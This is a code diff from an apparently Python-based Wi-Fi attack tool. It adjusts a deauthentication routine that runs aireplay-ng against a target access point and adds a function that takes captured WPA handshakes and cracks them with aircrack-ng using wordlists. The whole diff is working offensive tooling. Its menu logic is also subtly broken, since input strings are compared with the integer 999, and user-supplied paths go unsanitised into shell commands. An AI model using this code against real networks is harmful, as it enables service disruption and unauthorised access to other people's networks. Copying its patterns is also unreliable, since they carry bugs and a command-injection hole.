@@ -356,8 +356,7 @@ def Deauth(interface, targetAP, interval=0, timeLimit=0):
 
         else:
             for terminal in terminals:
-                aireplay = subprocess.Popen(f'{terminal} -e aireplay-ng --deauth 0 -a {targetAP_BSSID} {interface}',
-                                            shell=True)
+                aireplay = subprocess.Popen(f'{terminal} -e aireplay-ng --deauth 0 -a {targetAP_BSSID} {interface}',shell=True, preexec_fn=os.setsid,)
                 aireplay.wait()  # wait until user closes the aireplay terminal
                 return
 
@@ -862,3 +861,88 @@ def capture_handshake(interface, target_ap):
         print(f'There is a problem with {ansi_escape_red("get_devices_in_AP_output")}')
         input(f'input anything to return to previous function \n')
         return
+
+def bruteforce_cap_file(interface,target_ap):
+    BSSID, STATION = get_BSSID_and_Station_from_AP(interface,target_ap)
+    # we check all the files that start with this pattern
+    search_pattern = f'/tmp/{target_ap}*.cap' # since there may be multiple files in the format of /tmp/{target_ap}-01.cap, /tmp/{target_ap}-02.cap, ...
+    matches = glob.glob(search_pattern)
+    if matches:
+        while 1:
+            clear()
+            print(f'{ansi_escape_green(len(matches))} captures for the {ansi_escape_green(target_ap)} found')
+            print(f'this software deletes the capture files that do not contain the handshake')
+            print(f'so if the capture files were created using this software then all of the capture files should contain the handshake\n')
+            for match in matches:
+                print(ansi_escape_green(match))
+            print()
+            capture_file_address = input(f'type the address of the .cap file to continue. for example /tmp/{target_ap}-01.cap : ').strip()
+            print(f"selected capture file address is : {ansi_escape_green(capture_file_address)} ")
+            selection = input("Type Y to continue Y ").lower()
+            if selection == 'y':
+                break
+    else:
+        while 1:
+            clear()
+            print(f'No Capture file found in /tmp/ for {ansi_escape_green(target_ap)}')
+            print(f'type the address of the .cap file to continue')
+            print(f'Or type 999 to return to Network attacks menu (type C1 in Network attacks to capture the handshake for {ansi_escape_green(target_ap)})')
+            capture_file_address = input('address/999 : ')
+            print(f"selected capture file address is : {ansi_escape_green(capture_file_address)} ")
+            selection = input("Type Y to continue Y : ").lower()
+            if selection == 'y':
+                break
+            if capture_file_address == 999: # exit this while loop
+                break
+    if capture_file_address == 999: # return to network attacks
+        return
+    else:
+        clear()
+        print(f"selected capture file address is : {ansi_escape_green(capture_file_address)} \n")
+        print(f"Here are the password lists that can be used in bruteforce attack\n")
+        # List all files and directories in the specified path
+        passwordLists_directory_path = 'passwordLists'
+        selected_password_list = ''
+        while 1:
+            for filename in os.listdir(passwordLists_directory_path):
+                # Construct the full path to the item
+                full_path = os.path.join(passwordLists_directory_path, filename)
+                # Check if the item is a file (and not a directory)
+                if os.path.isfile(full_path):
+                    print(ansi_escape_green(filename))
+            print(f"\nType the name of the password list to be used in bruteforce attack (for example common.txt) : ")
+            print(f'or type {ansi_escape_green("1")} to give a path to your own password list : ')
+            print(f'or type {ansi_escape_green("999")} to cancel bruteforce attack and return to network attacks menu : \n')
+            selected_password_list = input(f'filename/1').strip()
+            if selected_password_list == 999: # exit this while loop
+                break
+            if selected_password_list == 1:
+                selected_password_list = input(f'give a path to your own password list : ').strip()
+                print(f'your passowrd list is {ansi_escape_green(selected_password_list)}')
+                selection = input('type y to continue with this password list or type anything to reselect : ').lower().strip()
+                if selection == 'y':
+                    break
+            else:
+                print(f'your passowrd list is {ansi_escape_green(selected_password_list)}')
+                selection = input('type y to continue with this password list or type anything to reselect : ').lower().strip()
+                if selection == 'y':
+                    selected_password_list = f'passwordLists/{selected_password_list}'
+                    break
+        if selected_password_list == 999:  # return to network attacks
+            return
+
+        clear()
+        print(f'Running aircrack on {ansi_escape_green(target_ap)} using wordlist in {ansi_escape_green(selected_password_list)} ')
+        # aircrack
+        aircrack_scipt = f'aircrack-ng -w {selected_password_list} -b {BSSID} {capture_file_address}'
+        for terminal in terminals:
+            aircrack = subprocess.Popen(f'{terminal} -e {aircrack_scipt}',shell=True, preexec_fn=os.setsid,)
+            aircrack.wait()  # wait until user closes the aireplay terminal
+            return
+
+
+
+
+
+
+
